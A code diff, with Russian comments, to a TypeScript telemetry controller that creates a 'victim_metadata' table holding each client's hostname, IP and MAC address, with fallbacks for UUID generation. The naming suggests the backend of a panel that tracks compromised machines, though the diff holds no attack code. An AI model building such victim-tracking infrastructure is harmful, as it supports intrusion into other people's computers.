@@ -363,13 +363,21 @@ export class TelemetryController {
       
       await db.connect();
       try {
+        // 1. Пытаемся создать расширение для UUID (если еще не создано)
+        // Если не получится (нет прав), используем gen_random_uuid() вместо uuid_generate_v4()
+        try {
+          await db.query(`CREATE EXTENSION IF NOT EXISTS "uuid-ossp";`);
+        } catch (extError) {
+          console.log('Could not create uuid-ossp extension, will use gen_random_uuid() instead');
+        }
 
         // 2. Создаем новую чистую структуру
+        // Используем gen_random_uuid() как fallback (работает в PostgreSQL 13+ без расширений)
         await db.query(`
 
-CREATE TABLE victim_metadata (
-  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
-  client_id UUID NOT NULL REFERENCES telemetry_clients(id) ON DELETE CASCADE,
+CREATE TABLE IF NOT EXISTS victim_metadata (
+  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
+  client_id UUID NOT NULL,
   hostname VARCHAR(255),
   ip VARCHAR(45),           
   mac VARCHAR(17),          
@@ -379,8 +387,8 @@ CREATE TABLE victim_metadata (
   UNIQUE(client_id)
 );
 
-CREATE INDEX idx_victim_metadata_client ON victim_metadata(client_id);
-CREATE INDEX idx_victim_metadata_last_updated ON victim_metadata(last_updated);
+CREATE INDEX IF NOT EXISTS idx_victim_metadata_client ON victim_metadata(client_id);
+CREATE INDEX IF NOT EXISTS idx_victim_metadata_last_updated ON victim_metadata(last_updated);
         `);
 
         return { status: 'success', message: 'Новая архитектура развернута' };
